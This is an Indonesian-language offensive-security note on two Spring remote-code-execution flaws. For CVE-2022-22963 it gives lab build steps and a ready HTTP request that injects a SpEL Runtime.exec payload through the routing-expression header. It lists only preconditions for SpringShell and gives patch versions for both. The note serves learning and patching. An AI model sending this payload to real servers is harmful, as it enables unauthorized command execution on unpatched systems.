# Spring Boot RCE
type: #offensive  #rce 
techniques: #rce #reverseshell
target: #springboot


## CVE-2022-22963
### Intro
Spring Cloud Function:
- Implementasi business logic via function
- Decouple the development lifecycle of business logic from any specific runtime target so that the same code can run as a webendpoint, a stream processor or a task.
- Support a uniform programming model across serverless providers, as well as the ability to run standalone (locally or in a PaaS)
- Enable Spring Boot features (auto-configuration, dependency injection, metrics) on serverless providers.

Spring Expression Language (SpEL): supports query and manipulating object graph at runtime. Add method for invocation and basic string templating functionality.
Spring Cloud Function <= 3.1.6 (untuk 3.1.x) dan <= 3.2.2 (untuk 3.2.x)  

### Vulnerability
Vulnerability pada SpEL (Spring Expression Language) melalui HTTP header bernama `spring.cloud.function.routing-expression` . 

Ketika terdapat pesan yang diarahkan kepada functionRouter, routing function akan menentukan fungsi yang akan menghandle proses tersebut. Secara eksplisit kita memilih `spring.cloud.function.routing-expression`.

Parameter pada header ini tidak divalidasi oleh Cloud Function. Vulnerability ini menambah koleksi bug RCE pada Spring Framework (sebelumnya CVE-2017-8046).

### PoC : 
Build process:
```sh
wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip

unzip v3.1.6.zip

cd spring-cloud-function-3.1.6

cd spring-cloud-function-samples/function-sample-pojo

mvn package

java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar
```


**Recon**
GET request ke direktori /functionRouter pada Spring Cloud Function.

```http
GET /functionRouter HTTP/1.1
host: <domain/ip>
User-Agent: <browser
Connection: close
Content-Length: 10

cyberkarta

```

**Eksploitasi**
Dengan memanipulasi  `Event Routing` , penyerang dapat menjalankan perintah (contohnya: whoami). Caranya adalah dengan mengirimkan POST request kepada `functionRouter` ditambah dengan payload `T(java.lang.Runtime).getRuntime().exec("whoami")`.
```HTTP
POST /functionRouter HTTP/1.1
host: <domain/ip>
User-Agent: <browser>
Connection: close
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("whoami")
Content-Length: 10

cyberkarta
```

### Mitigasi
Update Spring Cloud Function ke versi 3.1.7 ke atas (versi 3.1.x).
Update Spring Cloud Function ke versi 3.2.3 ke atas (versi 3.2.x).

### Referensi
https://spring.io/blog/2019/10/31/spring-cloud-stream-event-routing
https://github.com/hktalent/spring-spel-0day-poc


## CVE-2022-22965 (SpringShell)
Eksploit ini dapat dijalankan dengan ketentuan berikut:
- JDK9 +
- Apache Tomcat sebagai Servlet container
- Menggunakan tradisional WAR (bukan Spring Boot executable jar)
- Dependancy kepada `spring-webmvc` dan `spring-webflux`
- Spring version 5.30 - 5.3.17 atau 5.2.0 - 5.2.19

RCE juga tidak selalu dapat dijalankan, walaupun ketentuan terpenuhi.

Exploit ini membutuhkan aplikasi berjalan pada Tomcat sebagai WAR (Web Application Resource / Web application ARchive) deployment. Relate dengan bug pada 12 tahung lalu (CVE-2010-1622).


## Referensi
- https://www.fastly.com/blog/spring-has-sprung-breaking-down-cve-2022-22963-and-spring4shell-cve-2022
- https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/
- https://arstechnica.com/information-technology/2022/04/explaining-spring4shell-the-internet-security-disaster-that-wasnt/
- https://twitter.com/RandoriAttack/status/1509298490106593283?cxt=HHwWhoCyrd2-jfIpAAAA
- https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html